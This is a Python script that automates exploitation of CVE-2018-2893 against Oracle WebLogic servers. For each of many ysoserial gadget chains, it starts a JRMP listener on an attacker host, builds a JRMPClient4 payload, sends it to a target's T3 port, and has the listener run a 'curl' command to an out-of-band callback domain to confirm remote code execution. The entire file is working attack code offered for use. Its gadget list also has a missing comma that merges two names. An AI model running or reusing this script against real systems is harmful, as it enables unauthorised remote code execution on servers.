import subprocess
import time
import os
import argparse
from pathlib import Path

# === CONFIGURATION ===
GADGETS = [
    "JBossInterceptors1"
    "BeanShell1", "C3P0", "Click1", "Clojure", "CommonsBeanutils1",
    "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4",
    "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "FileUpload1", "Groovy1",
    "Hibernate1", "Hibernate2", "JBossInterceptors1", "JSON1", "JavassistWeld1", "Jdk7u21",
    "Jython1", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Myfaces2", "ROME",
    "Spring1", "Spring2", "URLDNS", "Vaadin1", "Wicket1"
]

BASE_PORT = 1999
PAYLOAD_DIR = Path("payloads")
YSOSERIAL_ALL = "ysoserial-all.jar"
YSOSERIAL_CVE = "ysoserial-cve-2018-2893.jar"
WEBLOGIC_PY = "weblogic.py"

# === ENSURE PAYLOAD DIR EXISTS ===
PAYLOAD_DIR.mkdir(exist_ok=True)

def run_jrmp_listener(port, gadget, callback_url, listen_ip):
    print(f"[+] Starting JRMPListener for {gadget} on port {port}")
    return subprocess.Popen([
        "java", "-cp", YSOSERIAL_ALL,
        "ysoserial.exploit.JRMPListener",
        str(port), gadget, f"curl {callback_url}"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def generate_payload(port, output_file, listen_ip):
    print(f"[+] Generating JRMPClient4 payload -> {output_file}")
    with open(output_file, "wb") as f:
        subprocess.run([
            "java", "-jar", YSOSERIAL_CVE, "JRMPClient4", f"{listen_ip}:{port}"
        ], stdout=f, check=True)

def send_payload(payload_path, target_ip, target_port):
    print(f"[+] Sending payload: {payload_path.name}")
    subprocess.run([
        "python", WEBLOGIC_PY,
        target_ip, str(target_port),
        str(payload_path)
    ], check=True)

def main():
    parser = argparse.ArgumentParser(description="Automate JRMPListener + CVE-2018-2893 exploitation.")
    parser.add_argument("--listen-ip", required=True, help="IP address for JRMP callback listener (attacker host)")
    parser.add_argument("--target-ip", required=True, help="Target WebLogic IP address")
    parser.add_argument("--target-port", type=int, required=True, help="Target WebLogic T3 port (default: 7001)")
    parser.add_argument("--dns-callback", required=True, help="DNS callback base (e.g., xxxxx.oast.fun)")

    args = parser.parse_args()

    for i, gadget in enumerate(GADGETS):
        port = BASE_PORT + i
        payload_path = PAYLOAD_DIR / f"{gadget}.ser"
        full_callback = f"{gadget}.{args.dns_callback}"

        listener = run_jrmp_listener(port, gadget, full_callback, args.listen_ip)
        time.sleep(5)  # Allow listener to initialize

        try:
            generate_payload(port, payload_path, args.listen_ip)
            send_payload(payload_path, args.target_ip, args.target_port)

            print("[*] Waiting 1 minute for callback...")
            time.sleep(60)

        except subprocess.CalledProcessError as e:
            print(f"[!] Error during {gadget}: {e}")
        finally:
            listener.terminate()
            try:
                listener.wait(timeout=2)
            except subprocess.TimeoutExpired:
                listener.kill()

        print(f"[✓] Done with {gadget}")
        print("-" * 50)

    print("[✓] All gadgets tested.")

if __name__ == "__main__":
    main()
